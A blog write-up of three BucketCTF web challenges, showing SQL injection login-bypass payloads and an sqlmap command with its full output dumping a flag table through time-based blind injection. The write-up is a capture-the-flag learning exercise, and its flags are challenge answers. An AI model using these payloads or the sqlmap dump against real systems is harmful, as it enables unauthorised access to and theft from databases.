---
author: "Asad Ullah"
title: "SQLi 1, 2, 3  - BucketCTF"
description: 
summary: Write-up on web sql injections easy, medium and hard.
date: 2023-04-10T05:04:24+05:00
Section: write-ups
categories:
- writeup
- web
tags:
- bucketctf
- sqli
- sql injection
- time based sqli
- payload
- blind sqli

draft: true

---

&nbsp;


## Web - SQLi - 1

{{< 
ctftime 
name="SQLi - 1" 
difficulty="Easy"  
points="200"
category="web"
>}}

&nbsp;

### Description

This is my first time using SQL. Its such a great and simple tool.

### Approach

I attempted several payloads, but ultimately, this one worked: `' or 1=1--`

![Untitled](/write-ups/ctftime/bucket/sqli-1.webp)

&nbsp;

---

**Flag: `bucket{s1mp13_sq11_ed0176a}`**

---

&nbsp;

&nbsp;

## Web - SQLi - 2

{{< 
ctftime 
name="SQLi - 2" 
difficulty="Medium"  
points="200"
category="web"
>}}

&nbsp;

### Description

Ok I upgrade my security by preventing you from using semicolons. A StackOverflow thread told me that would work.

### Approach

I attempted several payloads but found success with this one: `' OR 1 -- -`

![Untitled](/write-ups/ctftime/bucket/sqli-2.webp)

&nbsp;

---

**Flag: `bucket{m3d1um_sq11_693f79541}`**

---

&nbsp;

&nbsp;

## Web - SQLi - 3

{{< 
ctftime 
name="SQLi - 3" 
difficulty="Hard"  
points="290"
category="web"
>}}

&nbsp;

### Description

Finally! I moved the secret into a **COMPLETELY** different table. There is **NO** way you can find it now.

### Approach

After attempting some payloads manually without success, I used `SQLmap` and successfully retrieved the flag. The database was `MySQL` and the parameters were vulnerable to `blind SQL Injection`

&nbsp;

***Breakdown of options in the SQLmap command***

- **`-u`** specifies the target URL to be scanned.
- **`-data`** provides the POST data to be sent with the request.
- **`-p`** indicates the parameters to be tested for SQL injection.
- **`-method`** specifies the HTTP method used for the request.
- **`-dump`** dumps the contents of the database after a successful SQLi attack.

```bash
┌──(kali㉿iasad)-[~/CTFs/Tools/sqlmap-dev]
└─$ python3 sqlmap.py -u "http://213.133.103.186:6409/login" --data "userName=1&password=2" -p "userName,password" --method POST --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.4.6#dev}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.
[*] starting @ 15:35:20 /2023-04-10/

[15:35:21] [INFO] resuming back-end DBMS 'mysql' 
[15:35:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: userName (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: userName=1' AND (SELECT 5012 FROM (SELECT(SLEEP(5)))lPED) AND 'eyGp'='eyGp&password=2
---
[15:35:21] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[15:35:21] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:35:21] [INFO] fetching current database
[15:35:22] [INFO] resumed: railway
[15:35:22] [INFO] fetching tables for database: 'railway'
[15:35:22] [INFO] fetching number of tables for database 'railway'
[15:35:22] [INFO] resumed: 2
[15:35:22] [INFO] resumed: Flag
[15:35:22] [INFO] resumed: Users
[15:35:22] [INFO] fetching columns for table 'Flag' in database 'railway'
[15:35:22] [INFO] resumed: 2
[15:35:22] [INFO] resumed: id
[15:35:22] [INFO] resumed: value
[15:35:22] [INFO] fetching entries for table 'Flag' in database 'railway'
[15:35:22] [INFO] fetching number of entries for table 'Flag' in database 'railway'
[15:35:22] [INFO] resumed: 1
[15:35:22] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                       
[15:35:38] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[15:36:39] [INFO] adjusting time delay to 2 seconds due to good response times
bucke
[15:37:31] [ERROR] invalid character detected. retrying..
[15:37:31] [WARNING] increasing time delay to 3 seconds
t{j0
[15:38:58] [ERROR] invalid character detected. retrying..
[15:39:30] [ERROR] invalid character detected. retrying..
[15:39:30] [WARNING] increasing time delay to 6 seconds
1n5_m4k%}

[*] ending @ 15:47:24 /2023-04-10/
```

The flag was printed in pieces due to time-based SQL injection attack.

&nbsp;

---

**Flag: `bucket{j01n5_m4k%}`**

---

&nbsp;

&nbsp;

